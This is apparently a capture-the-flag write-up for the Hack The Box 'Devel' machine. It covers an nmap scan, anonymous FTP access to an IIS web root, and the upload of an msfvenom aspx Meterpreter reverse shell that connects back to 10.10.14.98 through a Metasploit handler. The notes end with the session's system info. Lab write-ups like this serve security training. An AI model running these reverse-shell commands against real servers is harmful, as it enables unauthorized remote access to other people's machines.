## Target

**IP Address:** 10.129.121.54

## Recon

#Nmap 

```bash
sudo nmap -T4 -sV -sC -p- -oA targetScan 10.129.121.54
```

###   Findings:

| Port  | Service   | Version                 |
| ----- | --------- | ----------------------- |
| 21    | ftp       | Microsoft ftpd          |
| 80    | http      | Microsoft IIS httpd 7.5 |

After running the nmap scan I found that port 21 and 80 are open
    A Microsoft ftp server is running on the machine on port 21 as well as a Microsoft IIS page on port 80

![[Images/Devel/nmapScan.png]]

The home page of the IIS page is just the default IIS7 page

![[iisPage.png]]

FTP allows anonymous login, as seen in the nmap scan as well as the directory listing from the scripts running. I was able to get logged in myself as well

![[ftpLogin.png]]

## Enumeration

#MsfVenom #MetaSploit  

*Creating the reverse meterpreter shell*
```msfvenom
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.98 LPORT=4242 -f aspx > reverse.aspx
```

*Setting up the Metasploit Meterpreter listener*
```metasploit
use exploit/multi/handler
```
```metasploit
set payload windows/meterpreter/reverse_tcp
```
```metasploit
set lhost 10.10.14.98
```
```metasploit
set lport 4242
```
```metasploit
set ExitOnSession false
```
```metasploit
exploit -j
```

I was able to create a reverse meterpreter shell using msfvenom and putting it into an aspx file type in order to run it on the IIS server.

![[meterpreterUpload.png]]

After putting the reverse meterpreter file onto the server I was able to browse to it on the web browser and get it to run on the server this way

![[shellStarting.png]]

Though the screen is blank, I can see in metasploit that the shell has been run, sent, and received

![[shellSentandReceived.png]]

After this connection started I was able to connect to the session and run commands to get info on the machine

## Recon

#MetaSploit 
###   Findings:

```metasploit
sessions -i 1
```
```metasploit
sysinfo
```

![[meterpreterConnection.png]]

**System Info**
    Computer: Devel
    OS: Windows 7 (6.1 Build 7600)
    Architecture: x86
    System Language: el_GR
    Domain: HTB
    Logged On Users: 2
    Meterpreter: x86/windows

![[exploitSuggester.png]]